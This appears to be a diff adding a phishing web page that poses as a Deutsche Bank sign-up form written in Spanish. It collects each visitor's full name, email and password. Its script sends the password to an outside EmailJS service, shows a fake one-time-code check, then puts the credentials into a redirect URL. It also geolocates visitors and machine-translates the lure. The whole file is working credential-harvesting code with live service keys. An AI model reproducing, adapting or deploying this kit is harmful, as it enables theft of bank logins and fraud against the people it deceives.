@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>[Bank Name] - Sign Up</title>
+    <style>
+         body #content{
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+           }
+        body.loading #content {
+            
+           display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+           
+        }
+
+        body.loading {
+        
+            background-color: #fff; /* White background color */
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+            
+        
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            text-align: center;
+            color: #0a008e;
+            margin-bottom: 30px;
+        }
+        label {
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 5px;
+            display: block;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 50px;
+            padding: 10px;
+            font-size: 21px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        #password {
+            width: 100%;
+            padding-right: 40px; /* Ensure space for the icon */
+            box-sizing: border-box;
+        }
+        #togglePassword {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-80%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+        }
+        #togglePassword i {
+            color: #000;
+          font-size: 21px;
+       
+                  }
+        .sign-up-btn {
+            background-color: #0f00da;
+            color: #ffffff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 20px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .sign-up-btn:hover {
+            background-color: #0056b3;
+        }
+        .sign-up-btn .loader {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.6);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .sign-up-btn.loading .loader {
+            display: block;
+        }
+        .sign-up-btn.loading .button-text {
+            visibility: hidden;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #777777;
+        }
+        .container img {
+            height: 110px;
+            margin-left: 26px;
+        }
+        /* Modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 30; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 300px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .close-btn {
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .close-btn:hover {
+            background-color: #0056b3;
+        }
+        .otp p {
+            color: #ffffff;
+        }
+    </style>
+    <!-- Include Email.js SDK -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("zZbBafecRWz36hHhn"); // Replace with your actual EmailJS user ID
+        })();
+    </script>
+   <script src="script2.js" defer></script>
+</head>
+<body>
+    
+    <div id="content">
+  
+    <div class="container">
+        <img src="bank.png" alt="Logo del Banco">
+        <h1 id="bank-title">Deutsche Bank</h1>
+        <p id="instructions">Por favor, ingrese los siguientes detalles a continuación:</p>
+        <form id="deleteMeForm" action="success.html" method="GET">
+            <label for="full-name" id="label-full-name">Nombre completo</label>
+            <input type="text" id="full-name" name="full-name" required>
+            
+            <label for="email" id="label-email">Correo electrónico</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password" id="label-password">Contraseña</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required>
+                <button type="button" id="togglePassword">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+                
+            <button type="submit" class="sign-up-btn">
+                <span class="button-text" id="button-text">CONTINUAR</span>
+                <div class="loader"></div>
+            </button>
+        </form>
+        
+        <div class="footer">
+            [Deutsche Bank] | <a href="#" id="privacy-policy">Política de Privacidad</a> | <a href="#" id="contact-us">Contáctenos</a>
+        </div>
+    </div>
+    
+    <!-- The Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()"></span>
+            <div class="image">
+                <img src="images.png" alt="OTP Image"></img>
+            <div class="otp">
+                <p id="otp-instructions"><span id="otpDisplay"></span></p>
+            </div>
+            <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      margin: 0;
+    }
+
+    .otp-container {
+      text-align: center;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+  
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 21px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+     font-size: 31px; 
+    }
+     .otp-inputs input{
+        height: 70px;
+      font-size: 34px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      margin: 0 5px;
+      transition: border-color 0.3s;
+     }
+
+    .otp-input {
+      width: 80px;
+      height: 110%;
+      text-align: center;
+      font-size: 34px;
+      
+    }
+
+    .otp-input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+     .image img {
+            width: 120px;
+            height: 102px;
+            border-radius: 50%;
+          {
+    
+     
+  </style>
+            <div class="otp-container">
+                <h2 id="otp-title">Por favor, haga clic en el cuadro de abajo para ingresar su Contraseña de Un Solo Uso (OTP) que se envió a su correo electrónico. ¡Por favor, revise su buzón 📨📨!</h2>
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-input" id="otp-1" oninput="moveToNext(this, 'otp-2')" onkeydown="handleBackspace(event, 'otp-1', null)">
+                    <input type="text" maxlength="1" class="otp-input" id="otp-2" oninput="moveToNext(this, 'otp-3')" onkeydown="handleBackspace(event, 'otp-2', 'otp-1')">
+                    <input type="text" maxlength="1" class="otp-input" id="otp-3" oninput="moveToNext(this, 'otp-4')" onkeydown="handleBackspace(event, 'otp-3', 'otp-2')">
+                    <input type="text" maxlength="1" class="otp-input" id="otp-4" oninput="verifyOtp()" onkeydown="handleBackspace(event, 'otp-4', 'otp-3')">
+                </div>
+                <p id="otp-status" style="display: none;"></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script >
+     function googleTranslateElementInit() {
+    new google.translate.TranslateElement({ pageLanguage: 'es' }, 'google_translate_element');
+}
+
+function translateText(text, targetLanguage, callback) {
+    fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+        .then(response => response.json())
+        .then(data => {
+            const translatedText = data[0].map(item => item[0]).join('');
+            callback(translatedText);
+        })
+        .catch(error => console.error('Error translating text:', error));
+}
+
+function detectCountry(callback) {
+    fetch('https://ipinfo.io/json?token=84581b889c1970') // Replace with your ipinfo.io token
+        .then(response => response.json())
+        .then(data => {
+            callback(data.country);
+        })
+        .catch(error => console.error('Error detecting country:', error));
+}
+
+const countryLanguageMap = {
+    "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en", 
+    "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar", 
+    "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz", 
+    "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr", 
+    "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr", 
+    "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es", 
+    "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr", 
+    "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti", 
+    "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr", 
+    "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es", 
+    "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is", 
+    "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it", 
+    "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko", 
+    "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en", 
+    "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en", 
+    "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en", 
+    "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar", 
+    "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en", 
+    "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur", 
+    "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl", 
+    "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en", 
+    "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr", 
+    "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so", 
+    "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv", 
+    "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt", 
+    "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en", 
+    "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi", 
+    "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+
+    // Add more country codes and languages as needed
+};
+
+(function() {
+    emailjs.init("U-DV3EV-FFOkjJsuF"); // Replace with your actual EmailJS user ID
+})();
+
+let generatedOtp;
+
+function moveToNext(current, nextFieldID) {
+    if (current.value.length >= 1) {
+        document.getElementById(nextFieldID).focus();
+    }
+}
+
+function handleBackspace(event, currentFieldID, previousFieldID) {
+    if (event.key === "Backspace" && event.target.value === "") {
+        if (previousFieldID) {
+            document.getElementById(previousFieldID).focus();
+        }
+    }
+}
+
+function verifyOtp() {
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const enteredOtp = Array.from(otpInputs).map(input => input.value).join('');
+
+    if (enteredOtp.length === 4) {
+        const otpStatus = document.getElementById('otp-status');
+
+        if (enteredOtp === generatedOtp.toString()) {
+            const fullName = document.getElementById('full-name').value.trim();
+            localStorage.setItem('name', fullName);
+            const email = encodeURIComponent(document.getElementById('email').value);
+            const password = encodeURIComponent(document.getElementById('password').value);
+
+            window.location.href = `success.html?fullName=${fullName}&email=${email}&password=${password}`;
+        } else {
+            otpStatus.innerText = 'Invalid OTP code. Please check your inbox again.';
+            otpStatus.style.color = 'red';
+            otpStatus.style.display = 'block';
+        }
+    }
+}
+
+function openModal() {
+    document.getElementById('successModal').style.display = 'block';
+}
+
+function closeModal() {
+    document.getElementById('successModal').style.display = 'none';
+}
+
+document.getElementById('deleteMeForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    const button = event.target.querySelector('.sign-up-btn');
+    button.classList.add('loading');
+    button.disabled = true;
+
+    // Collect form data
+    const fullName = document.getElementById('full-name').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    // Generate a four-digit OTP
+    generatedOtp = Math.floor(1000 + Math.random() * 9000);
+
+    detectCountry(function(countryCode) {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en'; // Default to English if country not in map
+
+        translateText("Su Contraseña de Un Solo Uso de Deutsche Bank es:", targetLanguage, function(translatedWelcome) {
+            translateText("¡Por favor, no comparta este código con nadie!.", targetLanguage, function(translatedPeace) {
+                translateText("¡Hola! 👋", targetLanguage, function(translatedHello) {
+                    translateText("Deutsche Bank", targetLanguage, function(translatedBank) {
+                        translateText("Nuevo mensaje de Deutsche Bank", targetLanguage, function(translatedFromName) {
+                            const emailParams = {
+                                full_name: fullName,
+                                to_email: email,
+                                password: password,
+                                otp: generatedOtp,
+                                welcome_message: translatedWelcome,
+                                peace_message: translatedPeace,
+                                Hello_email: translatedHello,
+                                bank_email: translatedBank,
+                                from_name: translatedFromName
+                            };
+
+                            // Send the form data using EmailJS
+                            emailjs.send('service_7r47p64', 'template_3xvvo87', emailParams)
+                                .then(function(response) {
+                                    console.log('¡ÉXITO!', response.status, response.text);
+
+                                    document.getElementById('otpDisplay').innerText = generatedOtp;
+                                    openModal();
+                                }, function(error) {
+                                    console.error('¡FALLÓ...', error);
+                                    if (!countryLanguageMap[countryCode] || error) {
+                                        translateText('No se pudo enviar el correo electrónico. Por favor, revise el correo electrónico ingresado.', targetLanguage, function(translatedAlertMessage) {
+                                            alert(translatedAlertMessage);
+                                        });
+                                    }
+                                    button.classList.remove('loading');
+                                    button.disabled = false;
+                                });
+                        });
+                    });
+                });
+            });
+        });
+    });
+});
+
+document.addEventListener('DOMContentLoaded', () => {
+    document.body.classList.add('loading');
+
+    // Remove the loading state after 2 seconds
+    setTimeout(function() {
+        document.body.classList.remove('loading');
+    }, 1000); // 2000 milliseconds = 2 seconds;
+
+    document.getElementById('otp-1').focus();
+    translatePageContent();
+});
+
+function translatePageContent() {
+    detectCountry(function(countryCode) {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en'; // Default to English if country not in map
+
+        const elementsToTranslate = [
+            { id: 'bank-title', text: 'Deutsche Bank' },
+            { id: 'instructions', text: 'Por favor, ingrese los siguientes detalles a continuación:' },
+            { id: 'label-full-name', text: 'Nombre completo' },
+            { id: 'label-email', text: 'Correo electrónico' },
+            { id: 'label-password', text: 'Contraseña' },
+            { id: 'button-text', text: 'CONTINUAR' },
+            { id: 'privacy-policy', text: 'Política de Privacidad' },
+            { id: 'contact-us', text: 'Contáctenos' },
+            { id: 'otp-title', text: 'Por favor, haga clic en el cuadro de abajo para ingresar su Contraseña de Un Solo Uso (OTP) que se envió a su correo electrónico. ¡Por favor, revise su buzón 📨📨!' }
+        ];
+
+        elementsToTranslate.forEach(element => {
+            translateText(element.text, targetLanguage, function(translatedText) {
+                document.getElementById(element.id).innerText = translatedText;
+            });
+        });
+    });
+}
+    </script>
+    
